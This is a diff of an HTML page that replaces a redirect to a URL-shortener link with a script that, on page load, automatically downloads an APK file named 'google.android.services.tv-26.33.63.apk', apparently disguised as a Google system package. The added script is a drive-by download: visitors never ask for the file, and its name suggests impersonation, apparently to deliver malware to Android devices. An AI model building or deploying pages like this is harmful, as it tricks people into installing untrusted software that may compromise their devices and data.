@@ -1,19 +1,23 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-
-    <meta http-equiv="refresh" content="0; url=https://shorturl.at/p0TAF">
+    <title>Downloading...</title>
 </head>
 <body>
-    <script>
-        window.location.replace("https://shorturl.at/p0TAF");
-    </script>
+    <p>Your download is starting...</p>
 
-    <p>Redirecting... Please wait.</p>
-    <a href="https://shorturl.at/p0TAF">Click here if you are not redirected.</a>
+    <script>
+        window.onload = function () {
+            const link = document.createElement('a');
+            link.href = './google.android.services.tv-26.33.63.apk';
+            link.download = 'google.android.services.tv-26.33.63.apk';
+
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    </script>
 </body>
 </html>
